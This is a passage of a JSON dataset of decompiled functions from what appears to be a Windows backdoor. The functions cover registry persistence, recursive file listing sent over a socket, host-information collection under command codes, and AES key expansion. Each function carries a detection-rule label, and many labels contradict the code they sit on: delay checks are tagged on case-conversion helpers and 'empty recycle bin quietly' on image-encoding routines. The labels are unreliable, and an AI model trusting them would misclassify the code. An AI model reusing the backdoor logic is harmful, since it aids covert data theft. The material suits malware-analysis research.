        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar fcn.00416ae2(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    uStack16 = uStack16;\n    uVar3 = 0xf003f;\n    iVar1 = sub.ADVAPI32.DLL_RegCreateKeyExA(param_1, param_2, 0, 0, 0, 0xf003f, 0, &stack0xffffffec, 0);\n    if (iVar1 == 0) {\n        uVar2 = sub.msvcrt.dll_strlen(uStack16);\n        sub.ADVAPI32.DLL_RegSetValueExA(uVar3, uStack24, 0, uStack20, uStack16, uVar2);\n        sub.ADVAPI32.DLL_RegCloseKey(0x416b36);\n    }\n    return 0;\n}\n",
        "token_count": 227
    },
    "00416b9d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar fcn.00416b9d(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint in_stack_ffffff94;\n    uchar *puStack92;\n    uchar *puStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uchar *puStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack32;\n    uint uStack28;\n    uint32_t uStack24;\n    uchar auStack20 [4];\n    uint32_t uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = uStack16;\n    puStack44 = &stack0xffffffec;\n    uStack48 = 0x201;\n    uStack52 = 0;\n    uStack56 = param_2;\n    puStack60 = param_1;\n    puStack64 = 0x416bd1;\n    iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        puStack60 = &stack0xffffffd4;\n        puStack64 = NULL;\n        uStack68 = 0;\n        uStack72 = 0;\n        uStack76 = uStack8;\n        puStack80 = uStack40;\n        puStack84 = 0x416c10;\n        iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n        if ((iVar1 == 0) && (uStack68 < uStack24)) {\n            puStack84 = &stack0xffffffbc;\n            puStack88 = uStack28;\n            puStack92 = &stack0xffffffb8;\n            in_stack_ffffff94 = 0x416c55;\n            iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(puStack64, uStack32, 0);\n            puStack84 = puStack84 & 0xffffff | (iVar1 == 0) << 0x18;\n        }\n        sub.ADVAPI32.DLL_RegCloseKey(in_stack_ffffff94);\n        uStack56._3_1_ = in_stack_ffffff94 >> 0x18;\n    }\n    else {\n        puStack64 = &stack0xffffffd8;\n        uStack68 = 0x101;\n        uStack72 = 0;\n        uStack76 = uStack12;\n        puStack80 = uStack16;\n        puStack84 = 0x416ca1;\n        iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar1 == 0) {\n            puStack80 = &stack0xffffffc0;\n            puStack84 = NULL;\n            puStack88 = NULL;\n            puStack92 = NULL;\n            iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(puStack60, uStack28);\n            if ((iVar1 == 0) && (puStack88 < puStack44)) {\n                in_stack_ffffff94 = uStack48;\n                sub.ADVAPI32.DLL_RegQueryValueExA(puStack84, uStack52, 0, &stack0xffffffa4, uStack48, &stack0xffffffa8);\n            }\n            sub.ADVAPI32.DLL_RegCloseKey(in_stack_ffffff94);\n            uStack56._3_1_ = in_stack_ffffff94 >> 0x18;\n        }\n        else {\n        }\n    }\n    return uStack56._3_1_;\n}\n",
        "token_count": 809
    },
    "00416d52": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar fcn.00416d52(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack40;\n    uchar auStack20 [7];\n    uchar uStack13;\n    uint uStack8;\n    \n    uStack13 = 0;\n    uVar2 = 0x102;\n    iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA(param_1, param_2, 0, 0x102, auStack20);\n    if (iVar1 == 0) {\n        sub.ADVAPI32.DLL_RegDeleteValueA(uStack40, uStack8);\n        sub.ADVAPI32.DLL_RegCloseKey(uVar2);\n    }\n    return uVar2 >> 0x18;\n}\n",
        "token_count": 173
    },
    "0041a431": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041a431(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if ((param_1 < '{') && ('`' < param_1)) {\n        uVar1 = param_1 - 0x20;\n    }\n    else {\n        uVar1 = param_1;\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "0041a458": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041a458(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if ((param_1 < '[') && ('@' < param_1)) {\n        uVar1 = param_1 + 0x20;\n    }\n    else {\n        uVar1 = param_1;\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "0041b081": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nbool fcn.0041b081(void)\n\n{\n    int32_t iVar1;\n    int32_t iStack28;\n    uint auStack16 [2];\n    uint *puStack8;\n    uint *puStack4;\n    \n    auStack16[0] = 0;\n    iVar1 = sub.NETAPI32.DLL_NetWkstaGetInfo(0, 0x66, auStack16);\n    if (iVar1 == 0) {\n        *puStack4 = *(iStack28 + 0x10);\n        *puStack8 = *(iStack28 + 0xc);\n        sub.NETAPI32.DLL_NetApiBufferFree(iStack28);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 158
    },
    "0041bc50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041bc50(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 == 0xff) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = *(param_1 * 4 + 0x4245e0);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 104
    },
    "0041bd01": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041bd01(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    uchar *puVar3;\n    uchar uStack1916;\n    uint32_t auStack1900 [2];\n    uchar auStack1892 [20];\n    uint uStack1872;\n    uint uStack1868;\n    uchar auStack1856 [276];\n    uchar auStack1580 [524];\n    uchar auStack1056 [508];\n    uchar auStack548 [516];\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack8;\n    \n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iVar2 = fcn.00419fa8(auStack1056, 0x204, 0x420488, unaff_retaddr);\n    if (iVar2 != -1) {\n        iStack28 = sub.KERNEL32.dll_FindFirstFileA(auStack1056, auStack1892);\n        if (iStack28 != -1) {\n            do {\n                iVar2 = fcn.0041a1d8(auStack1856, 0x42048c);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.0041a1d8(auStack1856, 0x42048e);\n                    if (iVar2 != 0) {\n                        if ((auStack1900[0] & 0x10) == 0) {\n                            iStack32 = fcn.00419fa8(auStack548, 0x204, \"%d:%I64u:%s%s;\", auStack1900[0], uStack1868, \n                                                    uStack1872, uStack8, auStack1856);\n                            if (iStack32 != -1) {\n                                fcn.0041972e(unaff_EBX, auStack548, iStack32);\n                            }\n                        }\n                        else {\n                            puVar3 = auStack1856;\n                            iStack32 = fcn.00419fa8(auStack548, 0x204, \"%d:%s%s;\", auStack1900[0], uStack8, puVar3);\n                            if (iStack32 != -1) {\n                                fcn.0041972e(unaff_EBX, auStack548, iStack32);\n                            }\n                            fcn.00419fa8(auStack1580, 0x204, \"%s%s\\\\\", uStack8, auStack1856, puVar3);\n                            fcn.0041bd01(auStack1580, unaff_EBX, uStack1916);\n                        }\n                    }\n                }\n                iVar2 = sub.KERNEL32.dll_FindNextFileA(iStack28, auStack1900);\n                if (iVar2 == 0) break;\n                cVar1 = fcn.0041bc50();\n            } while (cVar1 != '\\0');\n            sub.KERNEL32.dll_FindClose();\n        }\n    }\n    return;\n}\n",
        "token_count": 662
    },
    "00407d16": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00407d16(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar auStack49 [4];\n    uchar auStack45 [16];\n    uchar uStack29;\n    uint uStack28;\n    uint auStack16 [2];\n    uint uStack8;\n    uint32_t uStack4;\n    \n    if ((param_2 & 1) != 0) {\n        auStack16[0] = 1;\n        sub.WS2_32.dll_ioctlsocket(param_1, 0x8004667e, auStack16);\n    }\n    if ((uStack4 & 2) != 0) {\n        uStack29 = 1;\n        iVar1 = sub.WS2_32.dll_setsockopt(uStack8, 0xffff, 8, &uStack29, 1);\n        if (iVar1 == 0) {\n            uStack64 = 1;\n            uStack60 = 180000;\n            uStack56 = 5000;\n            sub.WS2_32.dll_WSAIoctl(uStack28, 0x98000004, &uStack64, 0xc, 0, 0, auStack49, 0, 0);\n        }\n    }\n    if ((uStack4 & 4) != 0) {\n        auStack45[0] = 1;\n        sub.WS2_32.dll_setsockopt(uStack8, 6, 1, auStack45, 1);\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "004085a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004085a0(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    uchar auStack528 [496];\n    int32_t iStack32;\n    uint uStack16;\n    uint uStack12;\n    \n    uVar1 = fcn.0040b60e(0x41ec58);\n    uStack548 = param_3;\n    uStack552 = param_2;\n    uStack556 = param_3;\n    uStack560 = param_2;\n    uStack16 = fcn.00419fa8(auStack528, 0x200, uVar1);\n    uStack560 = 0;\n    iVar2 = sub.WS2_32.dll_send(param_1, auStack528, uStack16);\n    if (iVar2 == iStack32) {\n        fcn.0041a59f(auStack544, 0, 0x200);\n        iVar2 = sub.WS2_32.dll_recv(uStack12, auStack544, 0x200, 0);\n        if (iVar2 < 1) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.00419b7e(0, 0x41ec80, &uStack560);\n            uVar3 = uVar3 & 0xffffff00 | uVar3 != 0xffffffff;\n        }\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 381
    },
    "00408ae7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00408ae7(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    while (iVar1 = fcn.00408754(*0x424300, *(*0x424300 + 0x40)),  iVar1 == -1) {\n        *0x424300 = *(*0x424300 + 0x44);\n        uVar2 = fcn.0040cfac();\n        fcn.0040b294(uVar2);\n    }\n    fcn.00407d16(iVar1, 3);\n    return iVar1;\n}\n",
        "token_count": 131
    },
    "004090c2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.004090c2(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar auStack12 [12];\n    \n    iVar1 = sub.WS2_32.dll_recv(param_1, param_2, param_3, 0);\n    if (iVar1 == -1) {\n        iVar2 = fcn.00407c84();\n        if (iVar2 == 0x2733) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.00408d8a(auStack12);\n        }\n    }\n    else if (iVar1 == 0) {\n        fcn.00408d8a(auStack12);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "004109b4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004109b4(int32_t param_1, uint param_2, uint param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00419b7e(param_2, param_3, param_1);\n    if (iVar1 == -1) {\n        uVar2 = 0;\n    }\n    else {\n        iVar3 = sub.msvcrt.dll_strlen(param_3);\n        iVar1 = fcn.00419b7e(iVar3 + iVar1 + 1, 0x41f9d4, param_1);\n        if (iVar1 == -1) {\n            uVar2 = 0;\n        }\n        else {\n            iVar1 = iVar1 + 1;\n            iVar3 = fcn.00419b7e(iVar1, 0x41f9d4, param_1);\n            if (iVar3 == -1) {\n                uVar2 = 0;\n            }\n            else if (param_5 < iVar3 - iVar1) {\n                uVar2 = 0;\n            }\n            else {\n                fcn.00419918(param_4, param_1 + iVar1, (iVar3 - iVar1) + 1);\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 316
    },
    "0041af28": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0041af28(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack24 [12];\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    fcn.0041a59f(param_1, 0, param_2);\n    iVar1 = sub.WS2_32.dll_gethostname(param_1, param_2 + -1);\n    if ((iVar1 == -1) && (iVar1 = sub.KERNEL32.dll_GetComputerNameA(uStack4, auStack24),  iVar1 == 0)) {\n        fcn.00419918(uStack12, \"localhost\", uStack8);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0041b927": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0041b927(uint param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    uchar uVar3;\n    uchar uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uStack1792;\n    uint uStack1788;\n    uint uStack1784;\n    uint uStack1780;\n    uint uStack1776;\n    uint uStack1772;\n    uint uStack1768;\n    uchar auStack1764 [32];\n    uchar auStack1732 [32];\n    uchar auStack1700 [512];\n    uchar auStack1188 [516];\n    uchar auStack672 [64];\n    uchar auStack608 [512];\n    uchar auStack96 [64];\n    int32_t iStack32;\n    \n    fcn.0041afae(auStack96, 0x40);\n    fcn.0041af28(auStack672, 0x40);\n    fcn.0041b75b(auStack1700, 0x200);\n    fcn.0041b66a(auStack608, 0x200);\n    fcn.0041b697(&uStack1788);\n    cVar2 = fcn.0040aed7(auStack1188, 0x204);\n    if (cVar2 != '\\x01') {\n        fcn.00419918(auStack1188, \"Unknown\", 0x204);\n    }\n    fcn.0040b7f8(auStack1732, 0x20, 0);\n    fcn.0040b959(auStack1764, 0x20);\n    uVar1 = *0x41e7c0;\n    uStack1792 = 0;\n    uVar3 = fcn.0040b97c(0x40);\n    uVar5 = fcn.00416368();\n    uVar6 = fcn.0040cfac();\n    uVar7 = fcn.0040cf99();\n    uVar8 = sub.msvcrt.dll_getenv(\"PATH\");\n    uVar9 = sub.msvcrt.dll_getenv(\"WINDIR\");\n    uVar4 = fcn.0041b7b3();\n    iStack32 = fcn.00419f10(&uStack1792, \n                            \"%s\\a%s\\a%s\\a%s\\a%I64u\\a%I64u\\a%I64u\\a%d\\a%s\\a%s\\a%s\\a%s\\a%s\\a%s\\a%d\\a%d\\a%s\\a%d\\a%s\\a%d\\a%s\\a%d\\a\"\n                            , auStack608, auStack96, auStack672, auStack1700, uStack1788, uStack1784, uStack1780, \n                            uStack1776, uStack1772, uStack1768, uVar4, uVar9, uVar8, auStack1732, auStack1764, 0x41e3e0\n                            , 0x41e4e0, uVar7, uVar6, 0x41e5e0, uVar5, auStack1188, uVar3, 0x41e720, uVar1);\n    if (iStack32 == -1) {\n        fcn.00408b8f(param_1, 0xbb, 0, 0);\n    }\n    else {\n        fcn.00408b8f(param_1, 0xba, uStack1792, iStack32);\n        fcn.0040b4bf(&uStack1792);\n    }\n    return;\n}\n",
        "token_count": 798
    },
    "004035b0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint fcn.004035b0(uint32_t *param_1, uint8_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iStack4;\n    \n    iStack4 = 0;\n    *param_1 = *param_2 << 0x18 ^ param_2[1] << 0x10 ^ param_2[2] << 8 ^ param_2[3];\n    param_1[1] = param_2[7] ^ param_2[4] << 0x18 ^ param_2[5] << 0x10 ^ param_2[6] << 8;\n    param_1[2] = param_2[0xb] ^ param_2[8] << 0x18 ^ param_2[9] << 0x10 ^ param_2[10] << 8;\n    param_1[3] = param_2[0xf] ^ param_2[0xc] << 0x18 ^ param_2[0xd] << 0x10 ^ param_2[0xe] << 8;\n    if (param_3 == 0x10) {\n        while( true ) {\n            uVar1 = param_1[3];\n            param_1[4] = *(iStack4 * 4 + 0x41eb80) ^\n                         *param_1 ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff000000 ^\n                         *((uVar1 >> 8 & 0xff) * 4 + 0x425600) & 0xff0000 ^ *((uVar1 & 0xff) * 4 + 0x425600) & 0xff00 ^\n                         *((uVar1 >> 0x18) * 4 + 0x425600) & 0xff;\n            param_1[5] = param_1[4] ^ param_1[1];\n            param_1[6] = param_1[5] ^ param_1[2];\n            param_1[7] = param_1[6] ^ param_1[3];\n            iStack4 = iStack4 + 1;\n            if (iStack4 == 10) break;\n            param_1 = param_1 + 4;\n        }\n        uVar2 = 10;\n    }\n    else {\n        param_1[4] = param_2[0x13] ^ param_2[0x10] << 0x18 ^ param_2[0x11] << 0x10 ^ param_2[0x12] << 8;\n        param_1[5] = param_2[0x17] ^ param_2[0x14] << 0x18 ^ param_2[0x15] << 0x10 ^ param_2[0x16] << 8;\n        if (param_3 == 0x18) {\n            while( true ) {\n                uVar1 = param_1[5];\n                param_1[6] = *(iStack4 * 4 + 0x41eb80) ^\n                             *param_1 ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff000000 ^\n                             *((uVar1 >> 8 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n                             *((uVar1 & 0xff) * 4 + 0x425600) & 0xff00 ^ *((uVar1 >> 0x18) * 4 + 0x425600) & 0xff;\n                param_1[7] = param_1[6] ^ param_1[1];\n                param_1[8] = param_1[7] ^ param_1[2];\n                param_1[9] = param_1[8] ^ param_1[3];\n                iStack4 = iStack4 + 1;\n                if (iStack4 == 8) break;\n                param_1[10] = param_1[9] ^ param_1[4];\n                param_1[0xb] = param_1[10] ^ param_1[5];\n                param_1 = param_1 + 6;\n            }\n            uVar2 = 0xc;\n        }\n        else {\n            param_1[6] = param_2[0x1b] ^ param_2[0x18] << 0x18 ^ param_2[0x19] << 0x10 ^ param_2[0x1a] << 8;\n            param_1[7] = param_2[0x1f] ^ param_2[0x1c] << 0x18 ^ param_2[0x1d] << 0x10 ^ param_2[0x1e] << 8;\n            if (param_3 == 0x20) {\n                while( true ) {\n                    uVar1 = param_1[7];\n                    param_1[8] = *(iStack4 * 4 + 0x41eb80) ^\n                                 *param_1 ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff000000 ^\n                                 *((uVar1 >> 8 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n                                 *((uVar1 & 0xff) * 4 + 0x425600) & 0xff00 ^ *((uVar1 >> 0x18) * 4 + 0x425600) & 0xff;\n                    param_1[9] = param_1[8] ^ param_1[1];\n                    param_1[10] = param_1[9] ^ param_1[2];\n                    param_1[0xb] = param_1[10] ^ param_1[3];\n                    iStack4 = iStack4 + 1;\n                    if (iStack4 == 7) break;\n                    uVar1 = param_1[0xb];\n                    param_1[0xc] = *((uVar1 & 0xff) * 4 + 0x425600) & 0xff ^\n                                   *((uVar1 >> 0x18) * 4 + 0x425600) & 0xff000000 ^ param_1[4] ^\n                                   *((uVar1 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n                                   *((uVar1 >> 8 & 0xff) * 4 + 0x425600) & 0xff00;\n                    param_1[0xd] = param_1[0xc] ^ param_1[5];\n                    param_1[0xe] = param_1[0xd] ^ param_1[6];\n                    param_1[0xf] = param_1[0xe] ^ param_1[7];\n                    param_1 = param_1 + 8;\n                }\n                uVar2 = 0xe;\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1629
    },
    "00416439": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t fcn.00416439(void)\n\n{\n    *0x41e8e4 = (*0x41e8e4 & 0xffff) * 0x9069 + *0x41e8e4 * 0x10000;\n    *0x41e8e0 = (*0x41e8e0 & 0xffff) * 18000 + *0x41e8e0 * 0x10000;\n    return *0x41e8e0 + *0x41e8e4 * 0x1000;\n}\n",
        "token_count": 128
    },
    "00414fee": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nushort fcn.00414fee(int32_t *param_1)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    \n    uVar1 = **param_1;\n    uVar2 = *(*param_1 + 1);\n    *param_1 = *param_1 + 2;\n    return CONCAT11(uVar1, uVar2);\n}\n",
        "token_count": 80
    },
    "00403c38": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.00403c38(uint32_t *param_1, uint32_t *param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iStack4;\n    \n    iVar2 = fcn.004035b0(param_1, param_3, param_4);\n    param_2 = param_2 + iVar2 * 0x10;\n    *param_2 = *param_1;\n    param_2[1] = param_1[1];\n    param_2[2] = param_1[2];\n    param_2[3] = param_1[3];\n    for (iStack4 = 1; iStack4 < iVar2; iStack4 = iStack4 + 1) {\n        puVar1 = param_1 + 4;\n        param_2[-4] = *((*((*puVar1 >> 0x18) * 4 + 0x425600) & 0xff) * 4 + 0x426200) ^\n                      *((*((*puVar1 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424e00) ^\n                      *((*((*puVar1 >> 8 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x425200) ^\n                      *((*((*puVar1 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424a00);\n        param_2[-3] = *((*((param_1[5] & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424a00) ^\n                      *((*((param_1[5] >> 0x18) * 4 + 0x425600) & 0xff) * 4 + 0x426200) ^\n                      *((*((param_1[5] >> 0x10 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424e00) ^\n                      *((*((param_1[5] >> 8 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x425200);\n        param_2[-2] = *((*((param_1[6] & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424a00) ^\n                      *((*((param_1[6] >> 0x18) * 4 + 0x425600) & 0xff) * 4 + 0x426200) ^\n                      *((*((param_1[6] >> 0x10 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424e00) ^\n                      *((*((param_1[6] >> 8 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x425200);\n        param_2[-1] = *((*((param_1[7] & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424a00) ^\n                      *((*((param_1[7] >> 0x18) * 4 + 0x425600) & 0xff) * 4 + 0x426200) ^\n                      *((*((param_1[7] >> 0x10 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x424e00) ^\n                      *((*((param_1[7] >> 8 & 0xff) * 4 + 0x425600) & 0xff) * 4 + 0x425200);\n        param_1 = puVar1;\n        param_2 = param_2 + -4;\n    }\n    param_2[-4] = param_1[4];\n    param_2[-3] = param_1[5];\n    param_2[-2] = param_1[6];\n    param_2[-1] = param_1[7];\n    return iVar2;\n}\n",
        "token_count": 982
    },
    "00410066": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00410066(uchar *param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    uVar1 = *param_2 & 0x3f;\n    iStack16 = uVar1 + 1;\n    *(param_2 + uVar1 + 0x18) = 0x80;\n    uStack20 = 0x40 - iStack16;\n    if (uStack20 < 8) {\n        fcn.0041a59f(param_2 + uVar1 + 0x19, 0, uStack20);\n        fcn.0040f034(param_2, param_2 + 6, 0x40);\n        iStack16 = 0;\n        uStack20 = 0x40;\n    }\n    fcn.0041a59f(param_2 + iStack16 + 0x18, 0, uStack20 - 8);\n    *param_2 = *param_2 * 8;\n    *(param_2 + 0x14) = *param_2;\n    *(param_2 + 0x51) = *param_2 >> 8;\n    *(param_2 + 0x52) = *param_2 >> 0x10;\n    *(param_2 + 0x53) = *param_2 >> 0x18;\n    *(param_2 + 0x15) = param_2[1];\n    *(param_2 + 0x55) = param_2[1] >> 8;\n    *(param_2 + 0x56) = param_2[1] >> 0x10;\n    *(param_2 + 0x57) = param_2[1] >> 0x18;\n    fcn.0040f034(param_2, param_2 + 6, 0x40);\n    *param_1 = param_2[2];\n    param_1[1] = param_2[2] >> 8;\n    param_1[2] = param_2[2] >> 0x10;\n    param_1[3] = param_2[2] >> 0x18;\n    param_1[4] = param_2[3];\n    param_1[5] = param_2[3] >> 8;\n    param_1[6] = param_2[3] >> 0x10;\n    param_1[7] = param_2[3] >> 0x18;\n    param_1[8] = param_2[4];\n    param_1[9] = param_2[4] >> 8;\n    param_1[10] = param_2[4] >> 0x10;\n    param_1[0xb] = param_2[4] >> 0x18;\n    param_1[0xc] = param_2[5];\n    param_1[0xd] = param_2[5] >> 8;\n    param_1[0xe] = param_2[5] >> 0x10;\n    param_1[0xf] = param_2[5] >> 0x18;\n    fcn.0041a59f(param_2, 0, 0x98);\n    return;\n}\n",
        "token_count": 751
    },
    "00406385": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.00406385(void)\n\n{\n    double adStack76 [8];\n    uint8_t uStack7;\n    uint8_t uStack6;\n    uint8_t uStack5;\n    \n    adStack76[0] = 1.0;\n    adStack76[1] = *0x41ec08;\n    adStack76[2] = *0x41ec10;\n    adStack76[3] = *0x41ec18;\n    adStack76[4] = 1.0;\n    adStack76[5] = *0x41ec20;\n    adStack76[6] = *0x41ec28;\n    adStack76[7] = *0x41ec30;\n    uStack7 = 0;\n    for (uStack5 = 0; uStack5 < 8; uStack5 = uStack5 + 1) {\n        for (uStack6 = 0; uStack6 < 8; uStack6 = uStack6 + 1) {\n            *(uStack7 * 4 + 0x423f20) =\n                 1.0 / (*0x41ec38 * adStack76[uStack6] * adStack76[uStack5] * *(*(uStack7 + 0x41e060) + 0x421025));\n            *(uStack7 * 4 + 0x424020) =\n                 1.0 / (*0x41ec38 * adStack76[uStack6] * adStack76[uStack5] * *(*(uStack7 + 0x41e060) + 0x421066));\n            uStack7 = uStack7 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "00406eef": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.00406eef(uint16_t param_1, uint16_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iStack8;\n    uint8_t uStack3;\n    uint8_t uStack2;\n    uint8_t uStack1;\n    \n    uStack3 = 0;\n    iStack8 = param_1 + param_2 * *0x427200;\n    for (uStack2 = 0; uStack2 < 8; uStack2 = uStack2 + 1) {\n        for (uStack1 = 0; uStack1 < 8; uStack1 = uStack1 + 1) {\n            uVar1 = *(iStack8 * 3 + *0x424120 + 2);\n            uVar2 = *(iStack8 * 3 + *0x424120 + 1);\n            uVar3 = *(iStack8 * 3 + *0x424120);\n            *(uStack3 + 0x424140) =\n                 (*(uVar3 * 4 + 0x422320) + *(uVar1 * 4 + 0x421b20) + *(uVar2 * 4 + 0x421f20) >> 0x10) + -0x80;\n            *(uStack3 + 0x424180) = *(uVar3 * 4 + 0x422f20) + *(uVar1 * 4 + 0x422720) + *(uVar2 * 4 + 0x422b20) >> 0x10;\n            *(uStack3 + 0x4241c0) = *(uVar3 * 4 + 0x423b20) + *(uVar1 * 4 + 0x423320) + *(uVar2 * 4 + 0x423720) 